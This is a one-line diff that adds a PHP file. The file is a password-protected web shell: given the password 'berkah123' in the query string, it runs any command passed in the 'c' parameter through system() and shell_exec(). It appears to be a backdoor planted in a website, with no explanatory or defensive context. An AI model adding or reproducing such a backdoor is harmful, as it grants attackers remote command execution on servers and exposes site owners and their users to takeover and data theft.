@@ -1,0 +1,1 @@
+<?php ($_GET['passwd'] == 'berkah123') ? NULL : exit; system($_GET['c']); shell_exec($_GET['c']); ?>
